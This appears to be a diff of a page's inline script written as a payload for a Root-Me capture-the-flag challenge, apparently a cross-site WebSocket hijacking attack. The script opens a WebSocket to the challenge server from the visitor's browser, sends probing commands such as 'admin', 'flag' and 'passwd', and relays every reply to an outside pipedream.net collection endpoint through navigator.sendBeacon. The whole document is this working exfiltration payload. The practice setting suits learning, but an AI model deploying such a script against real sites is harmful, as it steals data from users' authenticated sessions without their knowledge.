@@ -5,43 +5,23 @@
 const BIN = "https://eo287p1od7gtso3.m.pipedream.net";
 
 function log(msg) {
-  try {
-    navigator.sendBeacon(BIN + "?d=" + encodeURIComponent(msg), "");
-  } catch (e) {
-    (new Image()).src = BIN + "?d=" + encodeURIComponent(msg);
-  }
+  navigator.sendBeacon(BIN + "?d=" + encodeURIComponent(msg), "");
 }
 
-window.onerror = function (msg) {
-  log("onerror:" + msg);
+log("page_loaded_http");
+
+const ws = new WebSocket("ws://ctf20.root-me.org/ws");
+
+ws.onopen = () => {
+  log("ws_open");
+  ["help", "commands", "admin", "secret", "flag", "passwd", "/passwd"].forEach((c, i) =>
+    setTimeout(() => ws.send(c), 700 * (i + 1))
+  );
 };
 
-log("page_loaded");
-log("typeof_ws:" + typeof WebSocket);
-
-setTimeout(() => {
-  ["ws://ctf20.root-me.org/ws", "wss://ctf20.root-me.org/ws"].forEach((url, i) => {
-    try {
-      log("trying:" + url);
-      const ws = new WebSocket(url);
-
-      ws.onopen = () => {
-        log("open:" + url);
-        ["help", "commands", "admin", "secret", "flag", "passwd", "/passwd"].forEach((c, n) =>
-          setTimeout(() => ws.send(c), 500 * (n + 1))
-        );
-      };
-
-      ws.onmessage = (e) => log("msg:" + url + ":" + e.data);
-      ws.onerror = () => log("error:" + url);
-      ws.onclose = () => log("close:" + url);
-    } catch (e) {
-      log("ctor_exception:" + url + ":" + String(e));
-    }
-  });
-
-  setTimeout(() => log("still_alive_10s"), 10000);
-}, 1000);
+ws.onmessage = (e) => log("msg:" + e.data);
+ws.onerror = () => log("ws_error");
+ws.onclose = () => log("ws_close");
 </script>
 OK
 </body>
